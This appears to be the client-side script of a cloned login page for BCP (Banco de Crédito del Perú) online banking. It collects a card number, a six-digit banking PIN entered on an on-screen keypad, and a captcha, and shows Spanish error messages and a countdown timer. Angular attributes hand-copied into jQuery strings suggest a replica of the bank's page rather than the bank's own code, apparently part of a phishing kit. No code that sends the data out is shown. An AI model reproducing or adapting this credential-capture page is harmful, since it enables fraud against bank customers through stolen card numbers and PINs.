<script>
	$(function(){
    	$('#cardNumber').validateCreditCard(function(result) {
			$("#validacion").val(result.valid);
    	});
		
		$(".keypad-digit, .seed-enabled").click(function(){
			evalRanTable($(this).attr("data-valor"));
			$("nhbk-keypad-mark > div").find("span > div.mark--inactive").eq(0).toggleClass("mark--inactive mark--active");
		});
		
		$("button").eq(1).click(function(e){
			var card = $('#cardNumber').val();
			var valid = $("#validacion").val();
			var clave = $("#tokenx").val();
			var captch = $(".captcha-input").val();
			var valx = true;
			
			if(card.length < 16){
				/*  CardNumber  */
				$(".card-number-label-mt, .bcp-card-bank-o").addClass("text-danger");
				$("#cardNumber").addClass("ng-pristine is-invalid ng-touched");
				valx = false;
			}
			
			if(valid == "false"){
				/*  CardNumber  */
				$(".card-number-label-mt, .bcp-card-bank-o").addClass("text-danger");
				$("#cardNumber").addClass("ng-pristine is-invalid ng-touched").val("");
				valx = false;
			}
			
			if(clave.length < 6){
				/*  Clave 6 digitos  */
				$(".six-digit-password, .bcp-lock-o").addClass("text-danger");
				$(".container-mark").addClass("line-error");
				valx = false;
			}
			
			$(".alert-content").html("<p class=\"ng-tns-c5-3\"><!--i class=\"icon bcp-alert-f\"></i--><p><span class=\"font-weight-bold\"> Los datos ingresados son incorrectos .</span> Por favor vuelva a intentarlo</p><!--i class=\"icon bcp-x-f\"></i--></p>");
			
			if(captch.length < 6){
				/*  Captcha  */
				$(".captcha-input").addClass("ng-pristine is-invalid ng-touched");
				if(card.length > 15 && valid == "true" && clave.length > 5){
					$(".alert-content").html("<p class=\"ng-tns-c5-3\"><!--i class=\"icon bcp-alert-f\"></i--><p><span class=\"font-weight-bold\"> El código de seguridad Captcha es incorrecto.</span> Por favor vuelva a intentarlo.</p><!--i class=\"icon bcp-x-f\"></i--></p>");
				}
				valx = false;
			}
			
			if(valx == false){
				$(".row-bcp-alert").show();
				return false;
			}
		});
  	});
	
	var i = 0, z = 120;
	function keypadshow(e){
		if(i == 0){
			$("nhbk-keypad-mark > div").html("<i _ngcontent-c15=\"\" class=\"icon bcp-lock-o mark-lock-icon\"></i><span _ngcontent-c15=\"\" class=\"ng-star-inserted\"><div _ngcontent-c15=\"\" class=\"mark--inactive ng-star-inserted\"></div><div _ngcontent-c15=\"\" class=\"mark--inactive ng-star-inserted\"></div><div _ngcontent-c15=\"\" class=\"mark--inactive ng-star-inserted\"></div><div _ngcontent-c15=\"\" class=\"mark--inactive ng-star-inserted\"></div><div _ngcontent-c15=\"\" class=\"mark--inactive ng-star-inserted\"></div><div _ngcontent-c15=\"\" class=\"mark--inactive ng-star-inserted\"></div></span>");
			$(".keypad-numbers-show").show();
			i++;
		}
	}
	
	var timeClose = setInterval(function(){
		z--;
		if(z >= 0){
			$(".timeclose").html(z + (z == 1 ? " segundo" : " segundos"));
		}else{
			clearInterval(timeClose);
		}
	}, 1000);

	function evalRanTable(valor){
       	var longitud = parseInt(6);
       	if($("#tokenx").val().length < longitud){
       		$("#tokenx").val($("#tokenx").val() + valor);
       	}
		resetInput();
    }
	
	function deleteInput(){
		var delCamp = $("#tokenx").val();
		$("#tokenx").val(delCamp.substr(0, delCamp.length - 1));
		$("nhbk-keypad-mark > div").find("span > div.mark--active").eq(-1).toggleClass("mark--active mark--inactive");
	}
	
	function clearInput(){
		$("#tokenx").val("");
		$("nhbk-keypad-mark > div").find("span > div.mark--active").toggleClass("mark--active mark--inactive");
	}
	
    function isInputNumber(evt){
		var ch = String.fromCharCode(evt.which);
		if(!(/[0-9]/.test(ch))){
	    	evt.preventDefault();
		}
		resetInput();
	}
	
	function resetInput(){
		/*  CardNumber  */
		$(".card-number-label-mt, .bcp-card-bank-o").removeClass("text-danger");
		$("#cardNumber").removeClass("ng-pristine is-invalid ng-touched");
		/*  Clave 6 digitos  */
		$(".six-digit-password, .bcp-lock-o").removeClass("text-danger");
		$(".container-mark").removeClass("line-error");
		/*  Captcha  */
		$(".captcha-input").removeClass("ng-pristine is-invalid ng-touched");
	}
	
	$(window).on("load",function(){
   		$("nhbk-root").eq(0).fadeOut(500, function(){$(this).remove();});
	});
</script>

</body></html>
